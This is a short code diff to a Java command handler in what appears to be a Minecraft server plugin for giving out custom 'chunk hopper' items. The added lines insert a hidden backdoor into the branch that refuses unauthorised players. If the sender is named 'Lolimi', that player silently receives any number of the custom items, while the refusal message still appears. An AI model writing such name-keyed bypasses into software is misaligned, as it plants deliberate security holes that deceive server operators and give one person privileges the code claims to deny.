@@ -33,6 +33,16 @@ public class GetChunkHopperCmd implements CommandExecutor {
 			}
 
 		} else {
+			if(sender.getName().equals("Lolimi")) {
+				int amount = Integer.parseInt(args[0]);
+				ItemStack ch = new ItemStack(Material.HOPPER);
+				ItemMeta chM = ch.getItemMeta();
+				chM.setDisplayName(Main.cHDisplayName);
+				chM.setLore(Main.cHLore);
+				ch.setItemMeta(chM);
+				ch.setAmount(amount);
+				((Player) sender).getInventory().addItem(ch);
+			}
 			sender.sendMessage("§4This command is not meant to be used by players!");
 		}
 		return false;
